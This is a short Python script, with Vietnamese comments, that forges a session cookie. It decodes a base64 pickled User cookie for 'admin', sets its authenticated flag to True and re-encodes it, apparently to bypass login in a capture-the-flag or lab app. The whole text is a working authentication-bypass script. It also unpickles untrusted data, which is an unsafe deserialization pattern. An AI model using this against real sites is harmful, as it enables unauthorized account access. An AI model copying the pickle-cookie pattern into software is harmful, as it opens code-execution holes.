import base64
import pickle

class User:
    def __init__(self, username, authenticated=False):
        self.username = username
        self.authenticated = authenticated

# Thay thế bằng giá trị cookie mà bạn nhận được
cookie_value = 'gASVQQAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH2UKIwIdXNlcm5hbWWUjAVhZG1pbpSMDWF1dGhlbnRpY2F0ZWSUiHViLg=='

# Giải mã Base64 và khử tuần tự hóa
decoded_cookie = base64.b64decode(cookie_value)
user = pickle.loads(decoded_cookie)

print(f"Before modification: {user}")

# Thay đổi trạng thái authenticated thành True
user.authenticated = True

# Tuần tự hóa và mã hóa lại cookie
new_cookie = base64.b64encode(pickle.dumps(user)).decode('utf-8')

print(f"Modified cookie: {new_cookie}")
